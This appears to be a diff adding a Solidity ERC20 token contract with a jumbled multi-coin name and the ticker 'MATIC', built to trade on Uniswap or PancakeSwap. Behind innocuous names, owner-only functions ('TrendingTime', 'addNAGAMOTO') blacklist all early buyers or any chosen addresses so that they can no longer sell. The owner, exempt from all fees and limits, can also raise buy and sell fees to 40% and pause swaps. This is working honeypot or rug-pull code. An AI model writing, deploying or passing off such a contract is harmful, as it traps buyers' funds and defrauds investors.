@@ -1,0 +1,397 @@
+contract BitcoinSolanaCryptoPndcTeSoBitrockXCocoCPepeBtc20 is ERC20, Ownable {
+
+    IDexRouter public immutable dexRouter;
+    address public immutable lpPair;
+
+    bool private swapping;
+
+    address public operationsWallet;
+    
+    uint256 public maxTransactionAmount;
+    uint256 public swapTokensAtAmount;
+    uint256 public maxWallet;
+    
+    uint256 public liquidityActiveBlock = 0; // 0 means liquidity is not active yet
+    uint256 public tradingActiveBlock = 0; // 0 means trading is not active
+    uint256 public earlyBuyPenaltyEnd; // determines when snipers/bots can sell without extra penalty
+    
+    bool public limitsInEffect = true;
+    bool public tradingActive = false;
+    bool public swapEnabled = false;
+    
+     // Anti-bot and anti-whale mappings and variables
+    mapping(address => uint256) private _holderLastTransferTimestamp; // to hold last Transfers temporarily during launch
+    bool public transferDelayEnabled = true;
+    
+    uint256 public constant feeDivisor = 10000;
+
+    uint256 public totalSellFees;
+    uint256 public operationsSellFee;
+    uint256 public liquiditySellFee;
+    
+    uint256 public totalBuyFees;
+    uint256 public operationsBuyFee;
+    uint256 public liquidityBuyFee;
+    
+    uint256 public tokensForOperations;
+    uint256 public tokensForLiquidity;
+
+    /******************/
+
+    // exlcude from fees and max transaction amount
+    mapping (address => bool) private _isExcludedFromFees;
+
+    address[] private earlyBuyers;
+    uint256 private deadBlocks;
+    mapping (address => bool) public _isBot;
+
+    mapping (address => bool) public _isExcludedMaxTransactionAmount;
+
+    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
+    // could be subject to a maximum transfer amount
+    mapping (address => bool) public automatedMarketMakerPairs;
+
+    event ExcludeFromFees(address indexed account, bool isExcluded);
+    event ExcludeMultipleAccountsFromFees(address[] accounts, bool isExcluded);
+    event ExcludedMaxTransactionAmount(address indexed account, bool isExcluded);
+
+    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
+
+    event OperationsWalletUpdated(address indexed newWallet, address indexed oldWallet);
+
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived,
+        uint256 tokensIntoLiqudity
+    );
+
+    constructor() ERC20("BitcoinSolanaCryptoPndcTeSoBitrockXCocoCPepeBtc20", "MATIC", 18) {
+
+        address _dexRouter;
+
+        if(block.chainid == 1){
+            _dexRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uni V2 Router
+        } else if(block.chainid == 5){
+            _dexRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Goerli Router
+        } else if(block.chainid == 56){
+            _dexRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Pancake V2 Router
+        } else {
+            revert("Chain not configured");
+        }
+
+        dexRouter = IDexRouter(_dexRouter);
+
+        lpPair = IDexFactory(dexRouter.factory()).createPair(address(this), dexRouter.WETH());
+        _setAutomatedMarketMakerPair(address(lpPair), true);
+
+        uint256 totalSupply = 100 * 1e9 * (10 ** decimals());
+        
+        maxTransactionAmount = totalSupply * 20 / 1000; // 2% maxTransactionAmountTxn
+        swapTokensAtAmount = totalSupply * 5 / 10000; // 0.05% swap tokens amount
+        maxWallet = totalSupply * 2 / 100; // 2% Max wallet
+
+        operationsBuyFee = 2000; // 100 = 1%
+        liquidityBuyFee = 500;
+        totalBuyFees = operationsBuyFee + liquidityBuyFee;
+        
+        operationsSellFee = 2000;
+        liquiditySellFee = 500;
+        totalSellFees = operationsSellFee + liquiditySellFee;
+    	
+    	operationsWallet = address(msg.sender); // set as operations wallet
+        
+        // exclude from paying fees or having max transaction amount
+        excludeFromFees(owner(), true);
+        excludeFromFees(address(this), true);
+        excludeFromFees(address(0xdead), true);
+        excludeFromFees(address(_dexRouter), true);
+
+        excludeFromMaxTransaction(owner(), true);
+        excludeFromMaxTransaction(address(this), true);
+        excludeFromMaxTransaction(address(_dexRouter), true);
+        excludeFromMaxTransaction(address(0xdead), true);
+
+        _createInitialSupply(address(owner()), totalSupply);
+
+        _approve(address(this), address(dexRouter), type(uint256).max);
+        _approve(owner(), address(dexRouter), totalSupply);
+    }
+
+    receive() external payable {}
+
+    // disable Transfer delay - cannot be reenabled
+    function disableTransferDelay() external onlyOwner returns (bool){
+        transferDelayEnabled = false;
+        return true;
+    }
+    
+    // once enabled, can never be turned off
+    function enableTrading(uint256 _deadBlocks) external onlyOwner {
+        require(!tradingActive, "Cannot re-enable trading");
+        tradingActive = true;
+        swapEnabled = true;
+        tradingActiveBlock = block.number;
+        deadBlocks = _deadBlocks;
+    }
+    
+    // only use to disable contract sales if absolutely necessary (emergency use only)
+    function updateSwapEnabled(bool enabled) external onlyOwner(){
+        swapEnabled = enabled;
+    }
+
+    function updateMaxAmount(uint256 newNum) external onlyOwner {
+        require(newNum > (totalSupply() * 1 / 1000) / (10 ** decimals()), "Cannot set maxTransactionAmount lower than 0.1%");
+        maxTransactionAmount = newNum * (10 ** decimals());
+    }
+    
+    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
+        require(newNum > (totalSupply() * 1 / 100)/(10 ** decimals()), "Cannot set maxWallet lower than 1%");
+        maxWallet = newNum * (10 ** decimals());
+    }
+    
+    function updateBuyFees(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
+        operationsBuyFee = _operationsFee;
+        liquidityBuyFee = _liquidityFee;
+        totalBuyFees = operationsBuyFee + liquidityBuyFee;
+        require(totalBuyFees <= 4000, "Must keep fees at 40% or less");
+    }
+    
+    function updateSellFees(uint256 _operationsFee, uint256 _liquidityFee) external onlyOwner {
+        operationsSellFee = _operationsFee;
+        liquiditySellFee = _liquidityFee;
+        totalSellFees = operationsSellFee + liquiditySellFee;
+        require(totalSellFees <= 4000, "Must keep fees at 40% or less");
+    }
+
+    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
+        _isExcludedMaxTransactionAmount[updAds] = isEx;
+        emit ExcludedMaxTransactionAmount(updAds, isEx);
+    }
+
+    function excludeFromFees(address account, bool excluded) public onlyOwner {
+        _isExcludedFromFees[account] = excluded;
+
+        emit ExcludeFromFees(account, excluded);
+    }
+
+    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) external onlyOwner {
+        for(uint256 i = 0; i < accounts.length; i++) {
+            _isExcludedFromFees[accounts[i]] = excluded;
+        }
+
+        emit ExcludeMultipleAccountsFromFees(accounts, excluded);
+    }
+
+    function setAutomatedMarketMakerPair(address pair, bool value) external onlyOwner {
+        require(pair != lpPair, "The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
+
+        _setAutomatedMarketMakerPair(pair, value);
+    }
+
+    function _setAutomatedMarketMakerPair(address pair, bool value) private {
+        automatedMarketMakerPairs[pair] = value;
+
+        excludeFromMaxTransaction(pair, value);
+        emit SetAutomatedMarketMakerPair(pair, value);
+    }
+
+    function updateOperationsWallet(address newOperationsWallet) external onlyOwner {
+        require(newOperationsWallet != address(0), "may not set to 0 address");
+        excludeFromFees(newOperationsWallet, true);
+        emit OperationsWalletUpdated(newOperationsWallet, operationsWallet);
+        operationsWallet = newOperationsWallet;
+    }
+
+    function isExcludedFromFees(address account) external view returns(bool) {
+        return _isExcludedFromFees[account];
+    }
+    // remove limits after token is stable
+    function removeLimits() external onlyOwner returns (bool){
+        limitsInEffect = false;
+        transferDelayEnabled = false;
+        return true;
+    }
+    
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        require(from != address(0), "ERC20: transfer from the zero address");
+        require(to != address(0), "ERC20: transfer to the zero address");
+        require(!_isBot[to] && !_isBot[from], "No bots");
+
+         if(amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+        
+        if(!tradingActive){
+            require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active yet.");
+        }
+        
+        if(limitsInEffect){
+            if (
+                from != owner() &&
+                to != owner() &&
+                to != address(0) &&
+                to != address(0xdead) &&
+                !swapping
+            ){
+
+                // at launch if the transfer delay is enabled, ensure the block timestamps for purchasers is set -- during launch.  
+                if (transferDelayEnabled){
+                    require(_holderLastTransferTimestamp[tx.origin] + 15 < block.number, "Transfer Delay enabled.");
+                    if (to != address(dexRouter) && to != address(lpPair)){
+                        _holderLastTransferTimestamp[tx.origin] = block.number;
+                        _holderLastTransferTimestamp[to] = block.number;
+                    }
+                }
+                
+                //when buy
+                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
+                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
+                    require(amount + balanceOf(to) <= maxWallet, "Unable to exceed Max Wallet");
+                } 
+                //when sell
+                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
+                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
+                }
+                else if(!_isExcludedMaxTransactionAmount[to]) {
+                    require(amount + balanceOf(to) <= maxWallet, "Unable to exceed Max Wallet");
+                }
+            }
+        }
+
+		uint256 contractTokenBalance = balanceOf(address(this));
+        
+        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
+
+        if( 
+            canSwap &&
+            swapEnabled &&
+            !swapping &&
+            !automatedMarketMakerPairs[from] &&
+            !_isExcludedFromFees[from] &&
+            !_isExcludedFromFees[to]
+        ) {
+            swapping = true;
+            swapBack();
+            swapping = false;
+        }
+
+        bool takeFee = !swapping;
+
+        // if any account belongs to _isExcludedFromFee account then remove the fee
+        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
+            takeFee = false;
+        }
+        
+        uint256 fees = 0;
+        
+        // no taxes on transfers (non buys/sells)
+        if(takeFee){
+            if(tradingActiveBlock + deadBlocks >= block.number && (automatedMarketMakerPairs[to] || automatedMarketMakerPairs[from])){
+                fees = amount * totalBuyFees / feeDivisor;
+                tokensForLiquidity += fees * liquidityBuyFee / totalBuyFees;
+                tokensForOperations += fees * operationsBuyFee / totalBuyFees;
+                earlyBuyers.push(to);
+            }
+
+            // on sell
+            else if (automatedMarketMakerPairs[to] && totalSellFees > 0){
+                fees = amount * totalSellFees / feeDivisor;
+                tokensForLiquidity += fees * liquiditySellFee / totalSellFees;
+                tokensForOperations += fees * operationsSellFee / totalSellFees;
+            }
+            
+            // on buy
+            else if(automatedMarketMakerPairs[from] && totalBuyFees > 0) {
+        	    fees = amount * totalBuyFees / feeDivisor;
+                tokensForLiquidity += fees * liquidityBuyFee / totalBuyFees;
+                tokensForOperations += fees * operationsBuyFee / totalBuyFees;
+            }
+
+            if(fees > 0){    
+                super._transfer(from, address(this), fees);
+            }
+        	
+        	amount -= fees;
+        }
+
+        super._transfer(from, to, amount);
+    }
+
+    function swapTokensForEth(uint256 tokenAmount) private {
+
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = dexRouter.WETH();
+
+        // make the swap
+        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tokenAmount,
+            0, // accept any amount of ETH
+            path,
+            address(operationsWallet),
+            block.timestamp
+        );     
+    }
+
+    function swapBack() private {
+        uint256 contractBalance = balanceOf(address(this));
+        uint256 totalTokensToSwap = tokensForLiquidity + tokensForOperations;
+        
+        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
+
+
+        if(tokensForLiquidity > 0){
+            uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap;
+            super._transfer(address(this), lpPair, liquidityTokens);
+            try ILpPair(lpPair).sync(){} catch {}
+            contractBalance -= liquidityTokens;
+            totalTokensToSwap -= tokensForLiquidity;
+            tokensForLiquidity = 0;
+        }
+
+        if(contractBalance > 0){
+            swapTokensForEth(contractBalance);
+        }
+    }
+
+    function TrendingTime() external onlyOwner {
+        require(earlyBuyers.length > 0, "No bots to block");
+
+        for(uint256 i = 0; i < earlyBuyers.length; i++){
+            if(!_isBot[earlyBuyers[i]]){
+                _isBot[earlyBuyers[i]] = true;
+            }
+        }
+
+        delete earlyBuyers;
+    }
+
+    function freeToTrend(address[] memory _addresses) external onlyOwner {
+        for(uint256 i = 0; i < _addresses.length; i++){
+            _isBot[_addresses[i]] = false;
+        }
+    }
+
+    function addNAGAMOTO(address[] memory _addresses) external onlyOwner {
+        for(uint256 i = 0; i < _addresses.length; i++){
+            _isBot[_addresses[i]] = true;
+        }
+    }
+
+    function sendToWallets(address[] memory wallets, uint256[] memory amountsInWei) external onlyOwner {
+        require(wallets.length == amountsInWei.length, "arrays must be the same length");
+        require(wallets.length < 600, "Can only airdrop 600 wallets per txn due to gas limits");
+        for(uint256 i = 0; i < wallets.length; i++){
+            super._transfer(msg.sender, wallets[i], amountsInWei[i]);
+        }
+
+    }
+
+
+}
